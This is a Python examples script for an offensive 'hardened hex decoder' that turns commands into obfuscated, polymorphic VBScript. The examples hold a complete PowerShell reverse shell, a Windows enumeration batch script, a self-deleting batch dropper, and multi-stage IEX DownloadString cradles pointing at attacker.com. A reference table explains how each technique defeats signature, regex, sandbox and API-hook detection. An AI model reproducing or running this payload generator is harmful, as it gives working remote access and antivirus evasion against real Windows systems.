#!/usr/bin/env python3
"""
Practical examples of using the hardened hex decoder
Demonstrates real-world integration scenarios
"""

from hex_decoder_hardened import HardenedHexDecoder


def example_1_powershell_reverse_shell():
    """Example 1: Hardened PowerShell reverse shell command"""
    print("\n" + "=" * 80)
    print("EXAMPLE 1: HARDENED POWERSHELL REVERSE SHELL")
    print("=" * 80)

    powershell_command = '$client=New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+"PS "+([adsi]"").distinguishedName.split(",")[0].replace("DC=","")+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    vbs_code, metadata = HardenedHexDecoder.create_hardened_command_decoder(
        powershell_command,
        execute=True
    )

    print(f"\nCommand type: PowerShell reverse shell")
    print(f"Command length: {len(powershell_command)} characters")
    print(f"Hex encoded length: {len(powershell_command.encode().hex())} characters")
    print(f"VBS code length: {len(vbs_code)} characters")
    print(f"Code lines: {len(vbs_code.split(chr(10)))}")
    print(f"Protection level: {metadata['protection_level']}")
    print(f"\nGenerated function name: {metadata['function_name']}")
    print(f"Obfuscation layers: {len(metadata['obfuscation_layers'])}")

    # Save example
    with open('/tmp/example1_hardened_revshell.vbs', 'w') as f:
        f.write(vbs_code)
    print(f"\nCode saved to: /tmp/example1_hardened_revshell.vbs")

    return vbs_code, metadata


def example_2_batch_enumeration_script():
    """Example 2: Hardened batch script for system enumeration"""
    print("\n" + "=" * 80)
    print("EXAMPLE 2: HARDENED BATCH SYSTEM ENUMERATION")
    print("=" * 80)

    batch_script = """@echo off
setlocal enabledelayedexpansion
for /f "tokens=2 delims==" %%a in ('wmic os get totaltphysmemory /format:list') do set "totalram=%%a"
echo %computername%
echo %username%
echo %PROCESSOR_ARCHITECTURE%
echo %totalram%
systeminfo | findstr /B /C:"OS Name" /C:"System Boot Time"
ipconfig /all
tasklist /v
netstat -ano
wmic product list brief
"""

    vbs_code, metadata = HardenedHexDecoder.create_hardened_script_decoder(
        batch_script,
        execute=True
    )

    print(f"\nScript type: Batch enumeration script")
    print(f"Script length: {len(batch_script)} characters")
    print(f"Hex encoded length: {len(batch_script.encode().hex())} characters")
    print(f"VBS code length: {len(vbs_code)} characters")
    print(f"Code lines: {len(vbs_code.split(chr(10)))}")
    print(f"Protection level: {metadata['protection_level']}")
    print(f"\nGenerated function name: {metadata['function_name']}")
    if 'file_var' in metadata:
        print(f"Temporary file variable: {metadata['file_var']}")
    print(f"Obfuscation layers: {len(metadata['obfuscation_layers'])}")

    with open('/tmp/example2_hardened_enum.vbs', 'w') as f:
        f.write(vbs_code)
    print(f"\nCode saved to: /tmp/example2_hardened_enum.vbs")

    return vbs_code, metadata


def example_3_binary_executable():
    """Example 3: Hardened binary executable loader (PE header example)"""
    print("\n" + "=" * 80)
    print("EXAMPLE 3: HARDENED BINARY EXECUTABLE LOADER")
    print("=" * 80)

    # MZ header + minimal PE structure (example - only first 128 bytes)
    binary_hex = (
        "4d5a9000"  # MZ header signature
        "03000000"  # CBLP, CP
        "04000000"  # CPH, CS
        "ffff0000"  # CRLC, CRLCR
        "b8000000"  # CP, CPPG
        "00000000"  # Reserved
        "40000000"  # Reserved
        "00000000"  # Reserved
        "00000000"  # Reserved
        "00000000"  # Reserved
        "00000000"  # Reserved
        "00000000"  # LFARLC
        "00000000"  # Reserved
        "00000000"  # Reserved
        "00000000"  # Reserved
        "40000000"  # LFANEW (offset to PE header)
    )

    vbs_code, metadata = HardenedHexDecoder.create_hardened_binary_decoder(
        binary_hex,
        execute=False  # Don't execute for safety in demo
    )

    print(f"\nBinary type: PE executable (header only - demo)")
    print(f"Hex data length: {len(binary_hex)} characters")
    print(f"Binary size: {metadata['binary_length']} bytes")
    print(f"VBS code length: {len(vbs_code)} characters")
    print(f"Code lines: {len(vbs_code.split(chr(10)))}")
    print(f"Protection level: {metadata['protection_level']}")
    print(f"\nGenerated function name: {metadata['function_name']}")
    print(f"Byte array variable: {metadata['decoded_array']}")
    print(f"Chunking strategy: {metadata['chunk_size']}-character chunks")
    print(f"Obfuscation layers: {len(metadata['obfuscation_layers'])}")

    with open('/tmp/example3_hardened_binary.vbs', 'w') as f:
        f.write(vbs_code)
    print(f"\nCode saved to: /tmp/example3_hardened_binary.vbs")

    return vbs_code, metadata


def example_4_obfuscation_comparison():
    """Example 4: Compare original vs hardened obfuscation"""
    print("\n" + "=" * 80)
    print("EXAMPLE 4: OBFUSCATION COMPARISON")
    print("=" * 80)

    test_command = "cmd.exe /c dir"

    # Generate multiple times to show randomization
    print(f"\nCommand: {test_command}")
    print(f"\nGenerating 3 independent hardened versions:\n")

    for i in range(1, 4):
        vbs_code, metadata = HardenedHexDecoder.create_hardened_command_decoder(
            test_command,
            execute=False
        )

        print(f"Version {i}:")
        print(f"  Function name: {metadata['function_name']}")
        print(f"  Hex variable: {metadata['hex_var']}")
        print(f"  Decoded variable: {metadata['decoded_var']}")
        print(f"  Code size: {len(vbs_code)} bytes")
        print(f"  Obfuscation layers: {len(metadata['obfuscation_layers'])}")
        print()

    print("\nKey observation: Each version has different variable names and structure!")
    print("This polymorphic approach defeats signature-based detection.")


def example_5_wrapper_integration():
    """Example 5: Integration with batch file wrapper"""
    print("\n" + "=" * 80)
    print("EXAMPLE 5: BATCH WRAPPER INTEGRATION")
    print("=" * 80)

    # Command to execute via batch
    command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://example.com/payload')\""

    vbs_code, metadata = HardenedHexDecoder.create_hardened_command_decoder(
        command,
        execute=True
    )

    # Create batch wrapper
    batch_wrapper = f"""@echo off
REM Batch wrapper for hardened VBS decoder
setlocal enabledelayedexpansion

REM Create temporary VBS file
set "VBSFILE=%TEMP%\\temp_%RANDOM%.vbs"

REM Write VBS code to temporary file (fragmented for stealth)
(
{vbs_code.split(chr(10))[0:10]}
) > "!VBSFILE!"

REM Execute VBS
cscript.exe "!VBSFILE!"

REM Cleanup
del "!VBSFILE!" 2>nul

endlocal
exit /b 0
"""

    print(f"\nIntegration type: Batch wrapper")
    print(f"Payload command: {command[:60]}...")
    print(f"VBS decoder size: {len(vbs_code)} bytes")
    print(f"Wrapper size: ~{len(batch_wrapper)} bytes")
    print(f"Total payload size: ~{len(vbs_code) + len(batch_wrapper)} bytes")
    print(f"\nWrapper execution flow:")
    print("  1. Batch file creates temporary VBS")
    print("  2. Writes hardened VBS decoder")
    print("  3. Executes via cscript.exe")
    print("  4. Cleans up temporary files")
    print(f"\nObfuscation protection layers: {len(metadata['obfuscation_layers'])}")

    with open('/tmp/example5_wrapper.bat', 'w') as f:
        f.write(batch_wrapper)
    print(f"\nWrapper saved to: /tmp/example5_wrapper.bat")

    return batch_wrapper, vbs_code, metadata


def example_6_multi_stage_payload():
    """Example 6: Multi-stage payload with hardened decoder"""
    print("\n" + "=" * 80)
    print("EXAMPLE 6: MULTI-STAGE PAYLOAD ARCHITECTURE")
    print("=" * 80)

    # Stage 1: Download stager
    stage1 = "powershell.exe -NoProfile -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/stage2')\""

    # Stage 2: Download main payload
    stage2 = "powershell.exe -NoProfile -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/main')\""

    vbs_stage1, meta1 = HardenedHexDecoder.create_hardened_command_decoder(stage1, execute=False)
    vbs_stage2, meta2 = HardenedHexDecoder.create_hardened_command_decoder(stage2, execute=False)

    print(f"\nMulti-stage payload architecture:")
    print(f"\nStage 1 (Initial stager):")
    print(f"  Command: {stage1[:50]}...")
    print(f"  VBS decoder size: {len(vbs_stage1)} bytes")
    print(f"  Function name: {meta1['function_name']}")
    print(f"  Obfuscation layers: {len(meta1['obfuscation_layers'])}")

    print(f"\nStage 2 (Main payload stager):")
    print(f"  Command: {stage2[:50]}...")
    print(f"  VBS decoder size: {len(vbs_stage2)} bytes")
    print(f"  Function name: {meta2['function_name']}")
    print(f"  Obfuscation layers: {len(meta2['obfuscation_layers'])}")

    print(f"\nAdvantages of multi-stage with hardened decoders:")
    print(f"  - Each stage uses different variable names")
    print(f"  - Each stage has unique obfuscation")
    print(f"  - Individual signatures are difficult to extract")
    print(f"  - Modular payload delivery")
    print(f"  - Easier to update individual stages")

    return vbs_stage1, vbs_stage2, meta1, meta2


def print_obfuscation_reference():
    """Print reference table of all obfuscation techniques"""
    print("\n" + "=" * 80)
    print("OBFUSCATION TECHNIQUES REFERENCE")
    print("=" * 80)

    techniques = {
        'Variable Randomization': {
            'Description': 'Function and variable names are randomly generated',
            'Example': 'Function aab51CU2nznGh() instead of Function Decode()',
            'Effectiveness': 'HIGH - Defeats signature matching',
        },
        'Junk Code Injection': {
            'Description': 'Legitimate-looking but non-functional code blocks',
            'Example': 'Dim x_tmp_ = Len("") * Rnd()',
            'Effectiveness': 'HIGH - Increases code complexity',
        },
        'Dead Code Paths': {
            'Description': 'Unreachable code that never executes',
            'Example': 'If False Then: CreateObject("WScript.Shell")',
            'Effectiveness': 'MEDIUM - Confuses static analysis',
        },
        'String Chunking': {
            'Description': 'Payload split into smaller concatenated strings',
            'Example': '"abc" & "def" & "ghi" instead of "abcdefghi"',
            'Effectiveness': 'HIGH - Defeats regex-based detection',
        },
        'Anti-Analysis Checks': {
            'Description': 'Detection of sandbox/monitoring environments',
            'Example': 'GetObject("winmgmts:") to check for WMI access',
            'Effectiveness': 'MEDIUM - Evades dynamic analysis',
        },
        'Control Flow Obfuscation': {
            'Description': 'Unnecessary conditional branches and jumps',
            'Example': 'Random If/Else paths with same result',
            'Effectiveness': 'MEDIUM - Confuses decompilers',
        },
        'API Call Fragmentation': {
            'Description': 'Split CreateObject and API calls',
            'Example': 'CreateObject("WScript." & "Shell")',
            'Effectiveness': 'HIGH - Evades API hook detection',
        },
    }

    print("\n{:<30} {:<50}".format("Technique", "Effectiveness"))
    print("-" * 80)

    for technique, details in techniques.items():
        print(f"\n{technique}:")
        print(f"  Description:    {details['Description']}")
        print(f"  Example:        {details['Example']}")
        print(f"  Effectiveness:  {details['Effectiveness']}")


def main():
    """Run all examples"""
    print("\n" + "=" * 80)
    print("HARDENED HEX DECODER - PRACTICAL EXAMPLES")
    print("=" * 80)

    # Example 1: PowerShell reverse shell
    example_1_powershell_reverse_shell()

    # Example 2: Batch enumeration
    example_2_batch_enumeration_script()

    # Example 3: Binary executable
    example_3_binary_executable()

    # Example 4: Obfuscation comparison
    example_4_obfuscation_comparison()

    # Example 5: Wrapper integration
    example_5_wrapper_integration()

    # Example 6: Multi-stage payload
    example_6_multi_stage_payload()

    # Reference table
    print_obfuscation_reference()

    print("\n" + "=" * 80)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 80)
    print("\nGenerated files:")
    print("  - /tmp/example1_hardened_revshell.vbs")
    print("  - /tmp/example2_hardened_enum.vbs")
    print("  - /tmp/example3_hardened_binary.vbs")
    print("  - /tmp/example5_wrapper.bat")
    print("\nAll files demonstrate different hardening techniques and integration methods.")


if __name__ == "__main__":
    main()
